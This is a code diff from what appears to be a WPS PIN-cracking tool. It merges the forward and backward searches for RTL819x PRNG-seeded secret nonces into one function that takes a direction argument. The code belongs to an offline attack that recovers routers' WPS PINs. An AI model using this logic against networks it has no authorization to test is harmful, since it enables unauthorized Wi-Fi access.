@@ -293,7 +293,7 @@ unsigned int hardware_concurrency()
 #endif
 }
 
-int find_rtl_es(struct global *wps, char* pin)
+static int find_rtl_es_dir(struct global *wps, char *pin, int dir)
 {
 	uint_fast8_t found_p_mode = NONE;
 	struct glibc_prng glibc_prng;
@@ -301,11 +301,15 @@ int find_rtl_es(struct global *wps, char* pin)
 	int32_t res;
 	int i = 0; /* Must hold MODE3_TRIES */
 	uint8_t tmp_s_nonce[16];
+	int break_cond = (MODE3_TRIES + 1) * dir;
 
-	DEBUG_PRINT("Trying forward in time");
+	if (dir == 1)
+		DEBUG_PRINT("Trying forward in time");
+	else
+		DEBUG_PRINT("Trying backwards in time");
 
 	do {
-		i++;
+		i += dir;
 		glibc_seed(&glibc_prng, wps->nonce_seed + i);
 		for (uint_fast8_t j = 0; j < 4; j++) {
 			uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
@@ -326,7 +330,7 @@ int find_rtl_es(struct global *wps, char* pin)
 			DEBUG_PRINT("Pin found");
 		}
 		else if (r == PIN_ERROR) {
-			if (i == 1) {
+			if (i == 1 || i == -1) {
 				memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
 				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
 			}
@@ -334,8 +338,14 @@ int find_rtl_es(struct global *wps, char* pin)
 				memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
 				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
 			}
-			wps->s1_seed = wps->nonce_seed + i - 1;
-			wps->s2_seed = wps->nonce_seed + i;
+			if (dir == 1) {
+				wps->s1_seed = wps->nonce_seed + i - dir;
+				wps->s2_seed = wps->nonce_seed + i;
+			}
+			else {
+				wps->s1_seed = wps->nonce_seed + i;
+				wps->s2_seed = wps->nonce_seed + i - dir;
+			}
 
 			DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
 			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
@@ -354,63 +364,21 @@ int find_rtl_es(struct global *wps, char* pin)
 		else if (r == MEM_ERROR) {
 			return -MEM_ERROR;
 		}
-	} while (found_p_mode == NONE && i <= MODE3_TRIES);
+	} while (found_p_mode == NONE && i != break_cond);
 
-	if (found_p_mode == NONE) {
-		DEBUG_PRINT("Trying backwards in time");
-		i = 0;
-		do {
-			i++;
-			glibc_seed(&glibc_prng, wps->nonce_seed - i);
-			for (uint_fast8_t j = 0; j < 4; j++) {
-				uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
-				memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
-			}
-			memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
-			wps->s1_seed = wps->nonce_seed - i;
-			wps->s2_seed = wps->nonce_seed - i;
+	return found_p_mode;
+}
 
-			DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
-			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
-			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+static int find_rtl_es(struct global *wps, char *pin)
+{
 
-			uint_fast8_t r = crack(wps, pin);
-			if (r == PIN_FOUND) {
-				found_p_mode = RTL819x;
-				DEBUG_PRINT("Pin found");
-			}
-			else if (r == PIN_ERROR) {
-				if (i == 1) {
-					memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
-					memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-				}
-				else {
-					memcpy(wps->e_s2, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
-					memcpy(tmp_s_nonce, wps->e_s1, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
-				}
-				wps->s1_seed = wps->nonce_seed - i;
-				wps->s2_seed = wps->nonce_seed - i + 1;
+	int found_p_mode = find_rtl_es_dir(wps, pin, 1);
 
-				DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
-				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-				DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
-				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+	if (found_p_mode != NONE)
+		return found_p_mode;
 
-				uint_fast8_t r2 = crack(wps, pin);
-				if (r2 == PIN_FOUND) {
-					found_p_mode = RTL819x;
-					DEBUG_PRINT("Pin found");
-				}
-				else if (r2 == MEM_ERROR) {
-					return -MEM_ERROR;
-				}
-			}
-			else if (r == MEM_ERROR) {
-				return -MEM_ERROR;
-			}
-		} while (found_p_mode == NONE && i <= MODE3_TRIES);
-	}
+	found_p_mode = find_rtl_es_dir(wps, pin, -1);
+
 	return found_p_mode;
 }
 
